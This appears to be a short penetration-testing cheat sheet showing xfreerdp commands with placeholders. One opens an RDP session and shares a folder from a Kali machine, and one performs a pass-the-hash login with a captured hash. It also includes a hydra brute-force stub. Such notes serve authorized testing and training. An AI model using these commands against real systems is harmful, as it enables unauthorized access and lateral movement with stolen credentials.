```bash
# $ hydra ...
$ xfreerdp /u:[<domain>\\]<user> /p:<password> /v:<IP/HOST_NAME>[:<port>] +clipboard /dynamic-resolution /drive:smbfolder,$(pwd)

# +clipboard - clipboard redirection
# /drive:smbfolder,/tmp/x - share existing folder "/tmp/x" from kali as SMB share "smbfolder" 
```
For **pass-the-hash attack**
```bash
#kali
$ xfreerdp /u:[<domain>\\]<user> /pth:<hash> /v:<IP/HOST_NAME>[:<port>] +clipboard /dynamic-resolution
```